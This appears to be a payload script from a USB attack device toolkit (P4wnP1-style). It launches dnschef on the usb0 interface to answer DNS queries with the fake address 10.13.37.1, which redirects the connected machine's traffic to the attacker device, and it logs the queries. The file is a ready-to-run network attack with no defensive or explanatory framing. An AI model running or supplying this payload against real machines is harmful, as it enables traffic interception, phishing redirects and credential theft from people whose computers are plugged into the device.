# File: payloads/network/dns_spoof_redirect.py
import subprocess

print("[*] Starting DNS spoof and redirect payload...")
subprocess.run([
    "dnschef",
    "--interface", "usb0",
    "--fakeip", "10.13.37.1",
    "--logfile", "/opt/p4wnp1/logs/dnschef.log"
])
